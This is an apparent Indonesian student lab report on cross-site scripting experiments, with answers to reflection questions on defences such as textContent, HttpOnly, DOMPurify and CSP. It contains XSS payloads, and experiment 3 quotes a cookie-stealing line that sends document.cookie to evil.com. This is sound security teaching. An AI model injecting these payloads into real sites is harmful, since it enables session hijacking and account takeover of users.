1. Eksperimen 1: Stored XSS Attack
yang terjadi: Setelah memasukkan <script>alert('XSS!')</script> pada kolom komentar dan menekan tombol kirim, muncul popup alert bertuliskan "XSS!".
Script tersebut juga tersimpan di halaman komentar.

2. Eksperimen 2: Image Tag XSS
Kenapa ini bekerja padahal tidak ada tag <script>?
Karena atribut onerror adalah event handler JavaScript. Saat gambar gagal dimuat (karena src="x" tidak valid), event onerror dijalankan dan kode JavaScript di dalamnya dieksekusi oleh browser.

3. Eksperimen 3: Cookie Stealing Simulation
 Cookie apa yang muncul di alert? : Cookie yang muncul adalah sessionId=abc123xyz dan username=JohnDoe.
Jika attacker mengganti alert() dengan fetch('https://evil.com?cookie=' + document.cookie), apa yang akan terjadi? :Cookie korban akan dikirim ke server milik attacker tanpa sepengetahuan korban. Ini bisa menyebabkan pencurian session (session hijacking) dan attacker dapat mengambil alih akun korban.

4. Eksperimen 4: DOM Manipulation
Apa yang berubah di halaman?
Setelah memasukkan payload <img src="x" onerror="document.body.style.background='red'">, warna latar belakang halaman berubah menjadi merah.

5. Eksperimen 5: Versi Secure
Apa yang berbeda? Apakah XSS berhasil?
Setelah mencoba semua payload pada secure.html, tidak ada script yang dijalankan. Semua input ditampilkan sebagai teks biasa. Tidak muncul alert, tidak ada perubahan tampilan, dan cookie tidak dapat diakses.

6. Eksperimen 6: Bandingkan Kode
Jelaskan dengan kata-kata sendiri mengapa versi secure tidak vulnerable terhadap XSS.
:Versi secure tidak rentan terhadap XSS karena tidak menggunakan innerHTML.
Sebagai gantinya, versi secure menggunakan createElement() dan textContent, sehingga input pengguna diperlakukan sebagai teks biasa, bukan sebagai kode HTML atau JavaScript.

MENJAWAB PERTANYAAN REFLEKSI:
1. Karena onerror adalah atribut event handler yang menjalankan JavaScript ketika gambar gagal dimuat. Saat src="x" tidak ditemukan, event error dipicu dan kode di dalam onerror dijalankan oleh browser.

2. Stored XSS: Script disimpan di server/database dan otomatis menyerang semua pengguna yang membuka halaman tersebut.

Reflected XSS: Script dikirim melalui URL dan hanya menyerang korban yang mengklik link berbahaya.

3. Karena HttpOnly mencegah JavaScript mengakses cookie melalui document.cookie. Jika terjadi XSS, attacker tidak bisa mencuri session ID pengguna.

4. Gunakan library sanitasi seperti DOMPurify untuk membersihkan HTML dari script berbahaya sebelum ditampilkan. Jangan langsung menggunakan innerHTML tanpa proses sanitasi.

5. CSP membatasi sumber script yang boleh dijalankan oleh browser. Ini membantu mencegah eksekusi script berbahaya meskipun ada celah XSS.


